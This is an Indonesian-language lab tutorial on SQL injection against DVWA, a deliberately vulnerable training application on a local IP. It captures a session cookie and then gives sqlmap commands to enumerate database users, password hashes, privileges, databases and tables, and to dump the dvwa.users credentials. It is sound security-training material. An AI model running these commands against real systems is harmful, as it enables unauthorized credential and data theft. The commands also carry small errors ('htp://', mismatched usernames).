## LESSON 7

Inti dari Lesson 7 adalah mendapatkan 4 hal, yaitu:
1. **List** dari **Database Management Usernames dan Passwords**
2. **List** dari **Database**
3. **List** dari **Table** yang ada di dalam **Database** tertentu
4. **List** dari **Username** dan **Password** yang ada di dalam **Database**

**NOTE**
- IP yang digunakan adalah sesuai dengan IP tempat DVWA ter-deploy

### Langkah-langkah

**A. Mendapatkan PHP Cookie**
1. Lakukan **Tamper Data** ke dalam **DVWA**. Lalu klik **SQL Injection** dan masukkan angka **1** ke dalam **Text Box** lalu klik **Submit**. Lalu lakukan hal yang sama dengan **Tamper Data** di **Lesson** sebelumnya.

![SS 1](LESSON_7/1.png)

2. **Copy** **Referer Link**

![SS 2](LESSON_7/2.png)

3. **Paste** ke dalam **Notepad**

![SS 3](LESSON_7/3.png)

4. **Copy* **Cookie Information**

![SS 4](LESSON_7/4.png)

5. **Paste** ke dalam **Notepad**

Masukkan command

![SS 5](LESSON_7/5.png)

**B. Menggunakan SqlMap untuk Mendapatkan User dan Database Sekarang**
1. Masuk ke dalam **SqlMap** dan lakukan command berikut

```
cd /pentest/database/sqlmap
ls -l sqlmap.py
./sqlmap.py -u "htp://192.168.1.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=v0o6r5agj13d6ngqspllu9i6b2; security=low" -b --current-db --current-user
```

**NOTE**
- Untuk command setelah **-u** menggunakan **Referer Link** yang didapatkan
- PHPSESSID diisi dengan **Cookie** yang didapatkan
- Jika terdapat pilihan **y/n** maka pilih **y**

![SS 6](LESSON_7/6.png)

Didapatkan **User** dan **Database** yang digunakan sekarang

![SS 7](LESSON_7/7.png)

**C. Menggunakan SqlMap untuk mendapatkan Username dan Password Database Management**
1. Lakukan command berikut

```
./sqlmap.py -u "htp://192.168.1.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=v0o6r5agj13d6ngqspllu9i6b2; security=low" --string="Surname" --users --password
```

![SS 8](LESSON_7/8.png)

Didapatkan **Username** dan **Password** yang ada di dalam **Database Management**

![SS 9](LESSON_7/9.png)

2. Masukkan command berikut untuk mendapatkan **Database Privileges** untuk **User** yang baru ditambah **sani_hacker**

```
./sqlmap.py -u "htp://192.168.1.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=v0o6r5agj13d6ngqspllu9i6b2; security=low" -U db_hacker --privileges
```

![SS 10](LESSON_7/10.png)

Didapatkan **Privileges** dari **User** yang diinginkan

![SS 11](LESSON_7/11.png)

**D. Mendapatkan List dari Semua Database**
1. Lakukan command berikut

```
./sqlmap.py -u "htp://192.168.1.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=v0o6r5agj13d6ngqspllu9i6b2;  security=low" --dbs
```

![SS 12](LESSON_7/12.png)

Didapatkan **Database** yang ada

![SS 13](LESSON_7/13.png)

**E. Mendapatkan Tables dan Contents dari Database Tertentu**
1. Lakukan command berikut

```
./sqlmap.py -u "htp://192.168.1.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=v0o6r5agj13d6ngqspllu9i6b2;   security=low" -D dvwa --tables
```

![SS 14](LESSON_7/14.png)

Didapatkan **Tables** dari **Database** yang ditarget

![SS 15](LESSON_7/15.png)

2. Lakukan command berikut untuk mendapatkan **Columns** dari **Table** **dvwa.users**

```
./sqlmap.py -u "htp://192.168.1.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=v0o6r5agj13d6ngqspllu9i6b2;   security=low" -D dvwa -T users --columns
```

![SS 16](LESSON_7/16.png)

Didapatkan **Tables** dari **Database** yang ditarget

![SS 17](LESSON_7/17.png)

3. Lakukan command berikut untuk mendapatkan **User** dan **Password** dari **Table** **dvwa.users**

```
./sqlmap.py -u "htp://192.168.1.103/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=v0o6r5agj13d6ngqspllu9i6b2;   security=low" -D dvwa -T users -C user,password --dump
```

![SS 18](LESSON_7/18.png)

Didapatkan **User** dan **Password** dari **Database** yang ditarget

![SS 19](LESSON_7/19.png)

### Kesimpulan Lesson 7

Menggunakan **SqlMap** dapat menemukan informasi mengenai **Database** yang menjadi target
